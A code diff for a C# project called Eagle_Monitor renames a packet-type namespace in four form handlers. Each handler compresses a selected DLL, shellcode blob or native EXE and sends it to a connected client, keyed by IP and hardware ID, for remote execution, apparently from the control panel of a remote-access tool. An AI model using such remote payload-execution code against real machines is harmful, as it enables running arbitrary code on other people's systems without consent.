@@ -113,11 +113,11 @@ namespace Eagle_Monitor.Forms
                 byte[] b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(managedListView.SelectedItems[0].Text), 1);
                 Client C = Client.ClientDictionary[this.IP_Origin];
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.Execute;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.EXEC_MANAGED_DLL, b , managedListView.SelectedItems[0].SubItems[1].Text , Utilities.SplitPath(managedListView.SelectedItems[0].Text) };
+                D.DataReturn = new object[] { Shared.PacketType.EXEC_MANAGED_DLL, b , managedListView.SelectedItems[0].SubItems[1].Text , Utilities.SplitPath(managedListView.SelectedItems[0].Text) };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
@@ -153,11 +153,11 @@ namespace Eagle_Monitor.Forms
                 byte[] b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(unmanagedListView.SelectedItems[0].Text), 1);
                 Client C = Client.ClientDictionary[this.IP_Origin];
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.Execute;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.EXEC_NATIVE_DLL, b, Utilities.SplitPath(unmanagedListView.SelectedItems[0].Text) };
+                D.DataReturn = new object[] { Shared.PacketType.EXEC_NATIVE_DLL, b, Utilities.SplitPath(unmanagedListView.SelectedItems[0].Text) };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
@@ -193,11 +193,11 @@ namespace Eagle_Monitor.Forms
                 byte[] b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(shellCodeListView.SelectedItems[0].Text), 1);
                 Client C = Client.ClientDictionary[this.IP_Origin];
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.Execute;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.EXEC_SHELL_CODE, b, Utilities.SplitPath(shellCodeListView.SelectedItems[0].Text) };
+                D.DataReturn = new object[] { Shared.PacketType.EXEC_SHELL_CODE, b, Utilities.SplitPath(shellCodeListView.SelectedItems[0].Text) };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
@@ -233,11 +233,11 @@ namespace Eagle_Monitor.Forms
                 byte[] b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(nativePEListView.SelectedItems[0].Text), 1);
                 Client C = Client.ClientDictionary[this.IP_Origin];
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.Execute;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.EXEC_NATIVE_EXE, b, Utilities.SplitPath(nativePEListView.SelectedItems[0].Text) };
+                D.DataReturn = new object[] { Shared.PacketType.EXEC_NATIVE_EXE, b, Utilities.SplitPath(nativePEListView.SelectedItems[0].Text) };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
